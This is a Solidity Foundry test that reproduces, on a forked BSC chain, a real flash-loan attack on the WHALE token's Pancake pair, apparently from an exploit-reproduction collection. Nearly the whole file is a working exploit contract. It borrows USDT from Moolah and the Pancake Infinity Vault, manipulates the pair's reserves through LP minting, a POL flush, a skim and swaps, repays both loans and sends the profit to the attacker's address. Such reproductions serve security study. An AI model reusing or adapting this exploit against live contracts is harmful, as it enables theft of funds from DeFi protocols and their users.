// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,460.41 USDT
// Attacker : 0xa27eae743cd8c03e9b7c25ebf43dadbbc6df9bfa
// Attack Contract : 0x4ce3e5dea552d1440a8cd766a13a6384ea4d1386
// Attack Deployer : 0x6d4dce5c6972127f4ff40354f5efc31bf7e30719
// Attack Logic : 0x8420c6657bf7c37c7014e158404b6416fd82f714
// Vulnerable Contract : 0xabc79b7c5a0f1fe0ac55fcb7e659d5817e530123
// Victim : 0xabc79b7c5a0f1fe0ac55fcb7e659d5817e530123
// Attack Tx : https://bscscan.com/tx/0xf8f431b392a50eb997ecae2e35668d6dd4dc8568d002057600d2532e18f36d86

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xabc79b7c5a0f1fe0ac55fcb7e659d5817e530123#code

// @Analysis
// Twitter Guy : https://x.com/audit_911/status/2067451654694412720
//
// The attacker used a Moolah USDT flash loan plus a Pancake Infinity Vault lock to manipulate the WHALE/USDT
// Pancake pair while WHALE's transfer pipeline staged LP credit, flushed POL liquidity, and settled hashrate rewards.
// The final reserve imbalance let the attacker swap a large WHALE balance out of the pair for USDT, repay both
// temporary funding sources, and forward the remaining USDT to the attacker EOA.

address constant ATTACKER = 0xA27eAE743Cd8C03E9b7c25ebF43DADbBC6Df9bFA;
address constant WHALE_TOKEN = 0xABC79B7C5a0f1fE0aC55fcB7E659D5817E530123;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant WHALE_USDT_PAIR = 0xdD3190246D90E20EbE93378B004836dcb4Bd4D59;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WHALE_HASHRATE = 0x436C1758e9A9458b54187A2774e0Ac32De223691;
address constant POL_VAULT = 0x1D95B64A37a1434f10821DB82304f265728D96a5;
address constant PANCAKE_INFINITY_VAULT = 0x238a358808379702088667322f80aC48bAd5e6c4;
address constant MOOLAH_PROXY = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant REFERRER = 0xc83759EA31AED19e1964fdece783985201dc9Cf4;
address constant DEAD = 0x000000000000000000000000000000000000dEaD;

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IPancakeInfinityVault {
    function lock(
        bytes calldata data
    ) external returns (bytes memory result);
    function take(
        address currency,
        address to,
        uint256 amount
    ) external;
    function sync(
        address currency
    ) external;
    function settle() external payable returns (uint256 paid);
}

interface IPolVault {
    function flushPol() external returns (uint256 liquidityAdded);
}

interface IWHALEHashrate {
    function bindReferral(
        address upline
    ) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("bsc", 104_744_230);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(WHALE_TOKEN, "WHALE");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WHALE_USDT_PAIR, "WHALE/USDT Pancake pair");
        vm.label(WHALE_HASHRATE, "WHALEHashrate");
        vm.label(POL_VAULT, "PolVault");
        vm.label(PANCAKE_INFINITY_VAULT, "Pancake Infinity Vault");
        vm.label(MOOLAH_PROXY, "Moolah proxy");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 flashAmount = 7_772_960_679_833_989_887_601_242;

        vm.startPrank(ATTACKER, ATTACKER);
        WHALEExploit exploit = new WHALEExploit(ATTACKER);
        exploit.attack(flashAmount);
        vm.stopPrank();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 3400 ether, "USDT profit after both repayments");
    }
}

contract WHALEExploit {
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IERC20 private constant wbnb = IERC20(WBNB_TOKEN);
    IERC20 private constant whale = IERC20(WHALE_TOKEN);
    IPancakePair private constant pair = IPancakePair(WHALE_USDT_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IWHALEHashrate private constant hashrate = IWHALEHashrate(WHALE_HASHRATE);
    IPolVault private constant polVault = IPolVault(POL_VAULT);
    IPancakeInfinityVault private constant infinityVault = IPancakeInfinityVault(PANCAKE_INFINITY_VAULT);
    IMoolah private constant moolah = IMoolah(MOOLAH_PROXY);

    address private immutable profitReceiver;
    uint256 private infinityVaultDebt;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function attack(
        uint256 flashAmount
    ) external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: match the trace approvals, then borrow USDT from Moolah.
        wbnb.approve(MOOLAH_PROXY, type(uint256).max);
        usdt.approve(MOOLAH_PROXY, type(uint256).max);
        moolah.flashLoan(USDT_TOKEN, flashAmount, "");

        // step 12: after the Moolah pull, forward the remaining USDT to the EOA.
        usdt.transfer(profitReceiver, usdt.balanceOf(address(this)));
    }

    function onMoolahFlashLoan(
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == MOOLAH_PROXY, "not Moolah");

        // step 2: enter Pancake Infinity Vault's lock; it calls lockAcquired(bytes).
        infinityVault.lock("");
    }

    function lockAcquired(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == PANCAKE_INFINITY_VAULT, "not Infinity Vault");

        // step 3: temporarily take all available USDT from the Vault.
        infinityVaultDebt = usdt.balanceOf(PANCAKE_INFINITY_VAULT);
        infinityVault.take(USDT_TOKEN, address(this), infinityVaultDebt);

        _manipulateWhalePair();

        // step 10: repay the Pancake Infinity Vault accounting lock.
        infinityVault.sync(USDT_TOKEN);
        usdt.transfer(PANCAKE_INFINITY_VAULT, infinityVaultDebt);
        infinityVault.settle();

        return "";
    }

    function _manipulateWhalePair() private {
        // step 4: first USDT->WHALE buy, using the same pair output computation as the trace's router read.
        uint256 firstBuyUsdt = 1000 ether;
        uint256 firstWhaleOut = _getAmountOut(firstBuyUsdt, USDT_TOKEN, WHALE_TOKEN);
        usdt.transfer(WHALE_USDT_PAIR, firstBuyUsdt);
        pair.swap(0, firstWhaleOut, address(this), "");

        // step 5: transfer the received WHALE and a USDT side leg into the pair, then mint LP.
        uint256 whaleForFirstLp = whale.balanceOf(address(this));
        whale.transfer(WHALE_USDT_PAIR, whaleForFirstLp);
        uint256 firstLpUsdt = 1_282_802_761_974_940_717_135;
        usdt.transfer(WHALE_USDT_PAIR, firstLpUsdt);
        pair.mint(address(this));

        // step 6: flush POL; this re-enters WHALE's pair accounting through onPolStart/onPolEnd.
        polVault.flushPol();

        // step 7: bind the referral and do the trace's small USDT->WHALE reserve nudge.
        hashrate.bindReferral(REFERRER);
        uint256 smallBuyUsdt = 1 ether;
        uint256 smallWhaleOut = _getAmountOut(smallBuyUsdt, USDT_TOKEN, WHALE_TOKEN);
        usdt.transfer(WHALE_USDT_PAIR, smallBuyUsdt);
        pair.swap(0, smallWhaleOut, address(this), "");

        // step 8: pump the USDT reserve with a large buy, then send 3/8 of the pair WHALE balance back in.
        uint256 largeBuyUsdt = 15_000_000 ether;
        uint256 largeWhaleOut = _getAmountOut(largeBuyUsdt, USDT_TOKEN, WHALE_TOKEN);
        usdt.transfer(WHALE_USDT_PAIR, largeBuyUsdt);
        pair.swap(0, largeWhaleOut, address(this), "");

        uint256 whaleRecycle = whale.balanceOf(WHALE_USDT_PAIR) * 3 / 8;
        whale.transfer(WHALE_USDT_PAIR, whaleRecycle);

        // step 9: add the second USDT leg, self-skim, mint LP, then trigger zero-value accounting paths.
        uint256 secondLpUsdt = 5_627_166_965_683_900_781_893_915;
        usdt.transfer(WHALE_USDT_PAIR, secondLpUsdt);
        pair.skim(WHALE_USDT_PAIR);
        pair.mint(address(this));
        whale.transfer(address(this), 0);
        hashrate.transferFrom(WHALE_USDT_PAIR, DEAD, 0);

        // step 10: transfer the harvested WHALE imbalance into the pair and swap it to USDT.
        uint256 whaleProfitLeg = whale.balanceOf(address(this));
        whale.transfer(WHALE_USDT_PAIR, whaleProfitLeg);
        (, uint112 whaleReserve,) = pair.getReserves();
        uint256 finalWhaleIn = whale.balanceOf(WHALE_USDT_PAIR) - uint256(whaleReserve);
        uint256 finalUsdtOut = _getAmountOut(finalWhaleIn, WHALE_TOKEN, USDT_TOKEN);
        pair.swap(finalUsdtOut, 0, address(this), "");
    }

    function _getAmountOut(
        uint256 amountIn,
        address tokenIn,
        address tokenOut
    ) private view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        amountOut = router.getAmountsOut(amountIn, path)[1];
    }
}
